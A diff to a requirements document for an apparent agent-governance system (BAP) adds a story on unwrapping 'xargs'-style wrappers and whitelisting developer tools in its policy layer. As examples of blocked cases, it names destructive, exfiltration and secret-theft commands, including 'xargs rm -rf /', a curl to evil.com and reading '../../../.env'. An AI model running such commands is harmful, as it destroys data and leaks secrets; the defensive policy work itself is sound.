@@ -107,6 +107,7 @@ This document represents the complete functional and non-functional requirements
 | `BAP-830` | Non-Interactive Agent Execution Bottleneck Prevention & Dual-Layer Token Isolation Hardening | **DONE** | Diagnoses and resolves headless subshell HITL stdin hangs and Restricted Token ambient credential shielding on unlisted CLI tools (e.g. gh); preserves layer reporting contract in UI tests. |
 | `BAP-831` | GitHub CLI (gh) Whitelisting & Non-Interactive Agent Immunity from Terminal HITL Prompts | **DONE** | Whitelists `gh` across Cedar policies, AST classifier, and decomposer; guarantees interactive terminal HITL prompts are strictly disabled for all AI coding agents (Antigravity, Codex, OpenCode, Claude Code, Copilot) across environment variables and process ancestry. |
 | `BAP-832` | Standard Bitbucket & Stream Redirection Immunity with Native Lifecycle Prompt Monitoring Parity | **DONE** | Eliminates false-positive workspace boundary escape denials on standard device redirections (`2>/dev/null`, `>/dev/null`, `2>&1`, `>nul`, `>$null`); preserves Tier 1 Standard read-only command flow; updates V3 Cockpit prompt reporting to distinguish native lifecycle prompt monitoring (Claude Code, Codex) from IDE chat boundaries (Antigravity). |
+| `BAP-833` | Execution Wrapper Unwrapping (`xargs`, `time`, `timeout`, `nohup`) & Modern Developer Toolchain Permitted Execution | **DONE** | Resolves default-deny authorization failures on execution wrappers (`xargs cat`, `find | xargs wc -l`); unwraps inner commands for semantic classification and decomposition; whitelists modern developer tools (`xargs`, `rg`, `jq`, `yq`, `tree`, `basename`, `dirname`, `stat`, `file`, `printf`, `fd`) while preserving inviolable forbid invariants against secret access, path escapes, and exfiltration. |
 
 ### MVP exit sequence
 
@@ -4840,3 +4841,31 @@ Provides automated crash recovery, fleet state reconciliation, and streamlined o
   - **Interceptor Hook**: `cchook/interceptor.go` (`isStandardDevicePath`, `stripStandardRedirections`, `isMutatingShellCommand`, `extractCommandTarget`, `checkCommandWorkspaceEscape`).
   - **Cockpit UI**: `bap-controlplane/internal/dashboardui/web/v3.html` (lines 1114, 1653-1654, 1810-1825).
   - **Tests**: `bap-edge/internal/authz/canonical_path_test.go` (`TestIsStandardDevicePath`, `TestCheckCommandWorkspaceEscape_StandardDevices` PASS), `node tests/test_v3_controls.cjs` (PASS), `go test -C cchook -v ./...` (47/47 PASS).
+
+
+#### Story BAP-833: Execution Wrapper Unwrapping (`xargs`, `time`, `timeout`, `nohup`) & Modern Developer Toolchain Permitted Execution
+- **Type**: Bug Fix / Governance Alignment | **Points**: 5 | **Priority**: P1 - High | **Status**: `DONE`
+- **Description**:
+  Resolve default-deny authorization failures on execution wrapper utilities (`xargs cat`, `xargs grep`, `find ... | xargs wc -l`, etc.) and modern developer inspection tools (`rg`, `jq`, `yq`, `tree`, `basename`, `dirname`, `stat`, `file`, `printf`, `fd`) across BAP Cedar policy, semantic command classifier, and AST decomposer.
+
+- **Root Causes**:
+  1. `xargs` and similar wrappers (`time`, `timeout`, `nohup`, `nice`) were treated as standalone atomic executables rather than transparent execution wrappers. When an agent ran `xargs cat`, `bapedge` evaluated `executable: "xargs"`. Because `xargs` was not in Policy 1's whitelist or classified into `executable_class`, it hit `default deny (no permit policy matched)`.
+  2. `resolveExecutableClass` in `classifier.go` was overly restrictive, returning an empty string `""` for common developer inspection tools (`grep`, `head`, `tail`, `wc`, `sort`, `uniq`, `sed`, `awk`, `find`, `which`, `diff`, `rg`, `jq`, `tree`, etc.), preventing Cedar's `executable_class` permission check from matching.
+
+- **Key Changes**:
+  1. **Wrapper Unwrapping**: In `classifier.go` (step 3b) and `decomposer.go` (`decomposeXargs`), unwrapped execution wrappers (`xargs`, `time`, `timeout`, `nohup`, `nice`) to evaluate and decompose the inner command being executed (e.g. `xargs cat` -> evaluates `cat` with `ActionType: "read"`).
+  2. **Modern Developer Tool Whitelisting**: Added `xargs`, `rg`, `jq`, `yq`, `tree`, `basename`, `dirname`, `realpath`, `readlink`, `stat`, `file`, `printf`, `fd` to Cedar Policy 1 across all 35 copies of `policy.cedar` and `schema.json`.
+  3. **Comprehensive Semantic Classification**: Expanded `resolveExecutableClass()` across `toolchain`, `shell_builtin`, `filesystem`, and `system_utility` so all standard developer and POSIX utilities are recognized.
+  4. **Strict Security Invariant Retention**: Dangerous commands passed through `xargs` (e.g. `xargs rm -rf /`, `xargs curl http://evil.com`, `xargs cat ../../../.env`) remain strictly blocked by Policies 2, 3, and 5.
+
+- **Acceptance Criteria**:
+  - `Given` a coding agent running `xargs cat` or `find . -name '*.go' | xargs wc -l`,
+  - `When` checked by `bapedge check` or `interceptor.exe`,
+  - `Then` it returns `allowed: true` with canonical action matching the inner tool.
+  - `Given` an execution wrapper running an exfiltration or secret file theft command (`xargs curl`, `xargs cat .env`),
+  - `When` evaluated by BAP,
+  - `Then` it is strictly denied by Cedar forbid invariants.
+
+- **Unit Tests**:
+  - `TestXargsAndModernDevToolsAuthorization` in `authorizer_test.go` (PASS).
+  - All 104 asset copies verified in sync.
